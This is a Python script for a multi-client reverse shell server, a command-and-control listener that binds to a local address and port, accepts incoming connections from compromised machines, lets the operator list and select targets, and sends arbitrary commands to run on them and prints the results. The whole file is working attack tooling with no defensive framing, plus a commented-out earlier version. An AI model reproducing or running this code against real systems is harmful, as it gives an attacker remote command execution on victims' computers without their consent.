#!/usr/bin/env python
import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create socket (allows two computers to connect)
def socket_create():
	try:
		global host
		global port
		global s
		host = '192.168.1.36'
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print('Socket creation error: ' + str(msg))

# Bind socket to port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global s
		print('Binding socket to port: ' + str(port))
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
		print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
		accept_connections()


# Accept connections from multiple clients and save to list
def accept_connections():
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]
	while 1:
		try:
			print("[!]Waiting for conection...")
			conn, address = s.accept()
			conn.setblocking(1)
			all_connections.append(conn)
			all_addresses.append(address)
			print("[!]Reverse shell connected back | " + "IP " + address[0] + " | Port " + str(address[1]))
		except:
			print("Error accepting connections")

# Interactive prompt for sending commands remotely
def START():
	while True:
		cmd = input('ENTER COMMAND >')

		if cmd == 'list':
			list_connections()
			continue
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)
		else:
			print("Command not recognized")

# Displays all current connections
def list_connections():
	results = ''
	for i, conn in enumerate(all_connections):
		try:
			conn.send(str.encode(' '))
			conn.recv(20480)
		except:
			del all_connections[i]
			del all_addresses[i]
			continue
		results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n' 
	print('------ Clients ------' + '\n' + results)

# Select a target client
def get_target(cmd):
	try:
		target = cmd.replace('select ', '')
		target = int(target)
		conn = all_connections[target]
		print("You are now connected to " + str(all_addresses[target][0]))
		print(str(all_addresses[target][0]) + '> ')
		return conn
	except:
		print("[!]Not a valid selection")
		return None

# Connect with remote target client
def send_target_commands(conn):
	path = conn.recv(9999)
	while True:
		try:
			cmd = input(path.decode()+' >')
			if cmd == 'exit':
				print('------------ENDED CONNECTION------------')
				conn.send(cmd.encode())
				conn.close()
				s.close()
				sys.exit()
			if len(str.encode(cmd)) > 0:
				conn.send(cmd.encode())
				client_response = conn.recv(20480)
				print("[+]Command executed remotely: ")
				print(client_response.decode().replace('\\r\\n', '\n'))
			if cmd == 'quit':
				break
		except:
			print("Connection was lost")
			break

# Send commands
'''def send_commands(conn):
	path = conn.recv(9999)
	while True:
		cmd = input(path.decode()+' >')
		if cmd == 'exit':
			print('------------ENDED CONNECTION------------')
			conn.send(cmd.encode())
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd)) > 0:
			conn.send(cmd.encode())
			client_response = conn.recv(9999)
			print("[+]Command executed remotely: ")
			print(client_response.decode().replace('\\r\\n', '\n'), end="\n")
		s.close()
def MAIN():
	socket_create()
	socket_bind()
	accept_connections()


def START(self):
    while True:
        self = input('ENTER COMMAND >')
        if self == 'MAIN':
            MAIN()
            break
        else:
            print('INCORRECT COMMAND :(...')
            START()'''


# Create worker threads
def create_workers():
	for _ in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()
# Do the next job in the queue(one handres connections, other sends commands)

def work():
	while True:
		x = queue.get()
		if x == 1:
			socket_create()
			socket_bind()
			accept_connections()
		if x == 2:
			START()
		queue.task_done()

# Each list item is a new job
def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)
	queue.join()

create_workers()
create_jobs()
